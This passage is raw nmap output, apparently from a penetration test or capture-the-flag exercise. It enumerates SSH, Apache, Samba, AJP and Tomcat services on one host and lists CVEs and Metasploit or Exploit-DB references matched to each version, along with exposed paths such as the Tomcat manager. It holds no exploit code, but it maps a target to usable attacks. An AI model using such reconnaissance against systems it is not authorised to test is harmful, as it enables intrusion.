|   cpe:/a:openbsd:openssh:7.2p2: 
|     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
|     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
|     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
|     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
|     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
|     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
|     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
|     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
|     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234	*EXPLOIT*
|     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
|     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
|     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
|     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
|     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	EDB-ID:40963	4.6	https://vulners.com/exploitdb/EDB-ID:40963	*EXPLOIT*
|     	EDB-ID:40962	4.6	https://vulners.com/exploitdb/EDB-ID:40962	*EXPLOIT*
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
|     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
|     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
|     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
|     	EDB-ID:46193	0.0	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	EDB-ID:40136	0.0	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
|     	EDB-ID:40113	0.0	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
|     	EDB-ID:39569	0.0	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
|     	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
|_    	1337DAY-ID-10010	0.0	https://vulners.com/zdt/1337DAY-ID-10010	*EXPLOIT*
80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
| http-enum: 
|_  /development/: Potentially interesting directory w/ listing on &#039;apache/2.4.18 (ubuntu)&#039;
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#039;t find wp-login.php
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	*EXPLOIT*
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/FREEBSD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	*EXPLOIT*
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
|     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689	*EXPLOIT*
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
|     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1333/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1303/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
|     	EDB-ID:40909	5.0	https://vulners.com/exploitdb/EDB-ID:40909	*EXPLOIT*
|     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
|     	CVE-2016-8740	5.0	https://vulners.com/cve/CVE-2016-8740
|     	CVE-2016-4979	5.0	https://vulners.com/cve/CVE-2016-4979
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	4.9	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	*EXPLOIT*
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	MSF:ILITIES/UBUNTU-CVE-2018-1302/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1301/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
|     	EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688	*EXPLOIT*
|     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
|     	CVE-2016-1546	4.3	https://vulners.com/cve/CVE-2016-1546
|     	4013EC74-B3C1-5D95-938A-54197A58586D	4.3	https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D	*EXPLOIT*
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|     	EDB-ID:46676	0.0	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	EDB-ID:42745	0.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	1337DAY-ID-663	0.0	https://vulners.com/zdt/1337DAY-ID-663	*EXPLOIT*
|     	1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
|     	1337DAY-ID-4533	0.0	https://vulners.com/zdt/1337DAY-ID-4533	*EXPLOIT*
|     	1337DAY-ID-3109	0.0	https://vulners.com/zdt/1337DAY-ID-3109	*EXPLOIT*
|_    	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-jsonp-detection: Couldn&#039;t find any JSONP endpoints.
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       syn-ack ttl 61 Apache Jserv (Protocol v1.3)
8080/tcp open  http        syn-ack ttl 61 Apache Tomcat 9.0.7
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|   /manager/html: Apache Tomcat (401 )
|_  /docs/: Potentially interesting folder
|_http-jsonp-detection: Couldn&#039;t find any JSONP endpoints.
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:apache:tomcat:9.0.7: 
|     	B41082A1-4177-53E2-A74C-8ABA13AA3E86	10.0	https://vulners.com/githubexploit/B41082A1-4177-53E2-A74C-8ABA13AA3E86	*EXPLOIT*
|     	TOMCAT:5FF617CEB667027ABB70FDFB3A8FFD4C	9.3	https://vulners.com/tomcat/TOMCAT:5FF617CEB667027ABB70FDFB3A8FFD4C
|     	SMNTC-107906	9.3	https://vulners.com/symantec/SMNTC-107906
|     	PACKETSTORM:153506	9.3	https://vulners.com/packetstorm/PACKETSTORM:153506	*EXPLOIT*
|     	MSF:EXPLOIT/WINDOWS/HTTP/TOMCAT_CGI_CMDLINEARGS	9.3	https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/HTTP/TOMCAT_CGI_CMDLINEARGS	*EXPLOIT*
|     	EDB-ID:47073	9.3	https://vulners.com/exploitdb/EDB-ID:47073	*EXPLOIT*
|     	DB8D8364-06FB-55E8-934E-C013B00821B5	9.3	https://vulners.com/githubexploit/DB8D8364-06FB-55E8-934E-C013B00821B5	*EXPLOIT*
